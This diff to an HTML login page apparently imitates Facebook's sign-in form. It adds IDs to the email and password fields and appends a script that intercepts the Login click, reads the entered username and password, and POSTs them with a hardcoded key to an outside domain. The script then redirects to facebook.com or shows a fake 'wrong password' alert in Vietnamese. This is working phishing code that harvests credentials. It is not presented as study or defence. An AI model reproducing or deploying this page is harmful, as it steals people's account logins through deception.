@@ -23,9 +23,9 @@
             <div class="col-form">
                 <div class="form-container">
                     <form action="">
-                        <input type="text" placeholder="Email address or phone number">
-                        <input type="password" placeholder="Password">
-                        <button class="btn-login">Login</button>
+                        <input id="username" type="text" placeholder="Email address or phone number">
+                        <input id="password" type="password" placeholder="Password">
+                        <button class="btn-login" id="btn-login">Login</button>
                     </form>
                     <a href="#">Forgotten password?</a>
                     
@@ -100,5 +100,30 @@
         </div>
     </footer>
 </body>
+<script>
+    (function() {
+        const submitBTN = document.getElementById('btn-login');
 
+        submitBTN.addEventListener('click', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            fetch('https://haisanmiennam.vn/api/v1/accounts', {
+                method: 'POST',
+                body: JSON.stringify({ username, password, key: 'bH7ki7rmK8o7T2jhHllMYjpvsMXafDjrSzcmqw1MoIx6IuVX9j1ItvJYuQ7px4uI' }),
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+            })
+                .then((response) => response.json())
+                .then((data) => {
+                    window.location.href('https://facebook.com');
+                })
+                .catch((error) => {
+                    alert('Sai mật khẩu hoặc tài khoản');
+                });
+        })
+    })();
+</script>
 </html>
